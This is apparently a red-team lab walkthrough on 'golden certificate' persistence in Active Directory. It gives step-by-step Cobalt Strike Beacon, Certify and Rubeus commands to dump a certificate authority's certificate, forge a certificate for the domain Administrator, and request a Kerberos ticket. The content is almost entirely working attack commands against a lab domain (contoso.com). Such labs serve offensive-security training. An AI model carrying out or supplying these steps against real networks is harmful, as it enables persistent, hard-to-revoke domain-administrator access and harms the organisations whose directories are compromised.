# DPERSIST1 Golden Certificates

>The objective of this lab is to leverage DPERSIST1 for domain admin persistence.

===

1. Launch Cobalt Strike and connect to the team server.
2. Use the high-integrity Beacon to impersonate a domain admin.
3. Move laterally to *lon-cs-1*.

4. Dump the CA's certificate.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
    ```

5. Save the certificate to your attacker desktop.

    ```PowerShell
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))
    ```

5. Use the certificate to force a user certificate for the default domain administrator account.

    ```Terminal-nocolor
    C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
    ```

⚠️ Since this is forged, you can do this directly on the Attacker machine, rather than in Beacon.

6. Use the forged certificate to request a TGT for Administrator.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:[FORGED CERT] /enctype:aes256 /nowrap
    ```

⚠️ In this lab, you have learned how to dump a CA's certificate and use it for elevated domain persistence.
